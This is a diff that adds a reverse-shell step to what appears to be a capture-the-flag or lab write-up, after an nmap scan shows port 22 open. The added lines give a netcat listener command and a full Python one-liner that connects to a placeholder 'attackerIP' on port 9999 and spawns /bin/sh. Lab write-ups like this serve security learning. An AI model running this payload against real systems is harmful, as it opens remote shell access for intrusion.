@@ -39,6 +39,12 @@ since nmap reveals that the website has port 22 open we want to try to get a rev
 
 the outgoing traffic from the machine has less restrictions than ingoing traffic, this is why reverse shells often times work
 
+on our own attacker machine we setup a port listener with netcat using command: `nc -nlvp 9999`
+
+victim machine command: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerIP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' -`
+
+
+
 
 
 ## (Bonus) Easter egg kinda?
